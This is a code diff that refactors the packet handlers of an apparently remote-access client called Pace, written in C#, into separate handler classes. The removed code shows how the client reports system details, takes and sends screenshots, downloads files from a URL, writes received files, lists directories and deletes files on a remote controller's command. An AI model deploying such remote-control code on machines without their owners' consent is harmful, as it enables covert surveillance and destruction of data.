@@ -1,4 +1,5 @@
 ﻿using Pace.Client.Configuration;
+using Pace.Client.Handlers;
 using Pace.Client.Network;
 using Pace.Client.System;
 using Pace.Client.Web;
@@ -44,98 +45,13 @@ namespace Pace.Client
 
             var packetChannel = new PacketChannel();
 
-            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>((client, packet) =>
-            {
-                var systemInfo = SystemInformation.Get();
-                var addressInfo = client.Address.Split(':');
+            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>(SystemHandlers.HandleGetSystemInfo);
+            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>(SystemHandlers.HandleTakeScreenshot);
 
-                var infoPacket = new GetSystemInfoResponsePacket(
-                    ClientConfiguration.Identifier,
-                    addressInfo[0],
-                    int.Parse(addressInfo[1]),
-                    systemInfo.UserName,
-                    systemInfo.ComputerName,
-                    systemInfo.OperatingSystem
-                );
-
-                client.SendPacket(infoPacket);
-            });
-
-            packetChannel.RegisterHandler<DownloadFileRequestPacket>((client, packet) =>
-            {
-                var downloadFilePacket = (DownloadFileRequestPacket)packet;
-                new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
-            });
-
-            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>((client, packet) =>
-            {
-                var screenshot = ScreenCapture.CaptureScreen();
-
-                byte[] screenshotBytes = ScreenCapture.ImageToBytes(screenshot);
-
-                var screenshotResponsePacket = new TakeScreenshotResponsePacket(screenshotBytes);
-
-                client.SendPacket(screenshotResponsePacket);
-            });
-
-            packetChannel.RegisterHandler<SendFileRequestPacket>((client, packet) =>
-            {
-                var sendFilePacket = (SendFileRequestPacket)packet;
-                File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
-            });
-
-            packetChannel.RegisterHandler<GetDirectoryRequestPacket>((client, packet) =>
-            {
-                var getDirectoryPacket = (GetDirectoryRequestPacket)packet;
-
-                var path = getDirectoryPacket.Path == string.Empty ? Environment.GetFolderPath(Environment.SpecialFolder.Windows) : getDirectoryPacket.Path;
-
-                var directory = new DirectoryInfo(path);
-
-                if (!directory.Exists)
-                    return;
-
-                var folders = FileExplorer.GetDirectories(path);
-                var files = FileExplorer.GetFiles(path);
-
-                var infos = files.Select(file => new FileInfo(file));
-
-                var response = new GetDirectoryResponsePacket
-                {
-                    Path = path,
-                    Folders = folders,
-                    Files = infos.Select(info => info.Name).ToArray(),
-                    FileSizes = infos.Select(info => info.Length).ToArray()
-                };
-
-                client.SendPacket(response);
-            });
-
-            packetChannel.RegisterHandler<DeleteFileRequestPacket>((client, packet) =>
-            {
-                var deleteFilePacket = (DeleteFileRequestPacket)packet;
-
-                PrintDebug($"Requested deletion of file {deleteFilePacket.File}");
-
-                if (Directory.Exists(deleteFilePacket.File))
-                {
-                    Directory.Delete(deleteFilePacket.File);
-                }
-                else if (File.Exists(deleteFilePacket.File))
-                {
-                    File.Delete(deleteFilePacket.File);
-                }
-
-                var folders = FileExplorer.GetDirectories(Directory.GetParent(deleteFilePacket.File).FullName);
-                var files = FileExplorer.GetFiles(Directory.GetParent(deleteFilePacket.File).FullName);
-
-                client.SendPacket(new GetDirectoryResponsePacket
-                {
-                    Folders = folders,
-                    Files = files,
-                    FileSizes = files.Select(file => new FileInfo(file).Length).ToArray()
-                });
-            });
+            packetChannel.RegisterHandler<DownloadFileRequestPacket>(FileHandlers.HandleDownloadFile);
+            packetChannel.RegisterHandler<GetDirectoryRequestPacket>(FileHandlers.HandleGetDirectory);
+            packetChannel.RegisterHandler<DeleteFileRequestPacket>(FileHandlers.HandleDeleteFile);
+            packetChannel.RegisterHandler<SendFileRequestPacket>(FileHandlers.HandleSendFile);
 
             isRunning = true;
 
